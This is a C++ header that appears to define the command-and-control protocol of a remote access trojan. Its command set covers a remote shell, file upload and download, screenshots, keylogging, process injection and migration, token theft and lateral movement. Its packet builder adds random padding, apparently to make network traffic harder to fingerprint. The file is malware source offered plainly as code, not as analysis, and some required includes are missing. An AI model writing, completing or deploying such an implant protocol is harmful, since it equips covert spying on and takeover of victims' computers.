#pragma once
#include <cstdint>
#include <vector>
#include <string>


namespace Protocol {
    
    constexpr uint32_t MAGIC = 0xC0DEBABE;
    
    
    enum class Command : uint32_t {
        CMD_NOOP            = 0x00, 
        CMD_SHELL           = 0x01,  
        CMD_UPLOAD          = 0x02,  
        CMD_DOWNLOAD        = 0x03,  
        CMD_SCREENSHOT      = 0x04,  
        CMD_KEYLOG_START    = 0x05,  
        CMD_KEYLOG_STOP     = 0x06,  
        CMD_PS_LIST         = 0x07,  
        CMD_INJECT          = 0x08,  
        CMD_MIGRATE         = 0x09,  
        CMD_SLEEP           = 0x0A,  
        CMD_EXIT            = 0x0B,  
        CMD_TOKEN_STEAL     = 0x0C,  
        CMD_LATERAL_MOVE    = 0x0D,  
    };
    
    
    enum class Response : uint32_t {
        RESP_OK             = 0x100,
        RESP_ERROR          = 0x101,
        RESP_DATA           = 0x102,  
        RESP_TEXT           = 0x103,  
        RESP_SCREENSHOT     = 0x104,
        RESP_KEYLOG_DATA    = 0x105,
        RESP_HEARTBEAT      = 0x106,
    };

    
    inline bool operator==(Protocol::Response lhs, Protocol::Response rhs) {
        return static_cast<uint32_t>(lhs) == static_cast<uint32_t>(rhs);
    }
    inline bool operator!=(Protocol::Response lhs, Protocol::Response rhs) {
        return !(lhs == rhs);
    }

    inline bool operator==(Protocol::Command lhs, Protocol::Command rhs) {
        return static_cast<uint32_t>(lhs) == static_cast<uint32_t>(rhs);
    }
    inline bool operator!=(Protocol::Command lhs, Protocol::Command rhs) {
        return !(lhs == rhs);
    }

    struct PacketHeader {
        uint32_t magic;
        uint32_t command;
        uint32_t payload_size;
        uint32_t checksum;
    };

    
    __forceinline uint32_t calculate_checksum(const uint8_t* data, size_t len) {
        uint32_t sum = 0;
        for (size_t i = 0; i < len; i++) {
            sum = (sum << 1) ^ data[i];
        }
        return sum;
    }

    
    __forceinline std::vector<uint8_t> create_packet(Command cmd, const std::vector<uint8_t>& payload) {
        PacketHeader header;
        header.magic = MAGIC;
        header.command = static_cast<uint32_t>(cmd);
        header.payload_size = static_cast<uint32_t>(payload.size());
        header.checksum = calculate_checksum(payload.data(), payload.size());

        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(16, 256);
        size_t padding_size = dist(gen);
        
        std::vector<uint8_t> padding(padding_size);
        std::generate(padding.begin(), padding.end(), gen);

        std::vector<uint8_t> packet;
        packet.insert(packet.end(), reinterpret_cast<uint8_t*>(&header), 
                     reinterpret_cast<uint8_t*>(&header) + sizeof(header));
        packet.insert(packet.end(), payload.begin(), payload.end());
        packet.insert(packet.end(), padding.begin(), padding.end());

        return packet;
    }

    
    __forceinline bool parse_packet(const std::vector<uint8_t>& data, 
                                     PacketHeader& header, 
                                     std::vector<uint8_t>& payload) {
        if (data.size() < sizeof(PacketHeader)) return false;

        memcpy(&header, data.data(), sizeof(PacketHeader));
        
        if (header.magic != MAGIC) return false;
        if (header.payload_size > data.size() - sizeof(PacketHeader)) return false;

        payload.assign(data.begin() + sizeof(PacketHeader), 
                      data.begin() + sizeof(PacketHeader) + header.payload_size);

        uint32_t calc_sum = calculate_checksum(payload.data(), payload.size());
        return calc_sum == header.checksum;
    }
};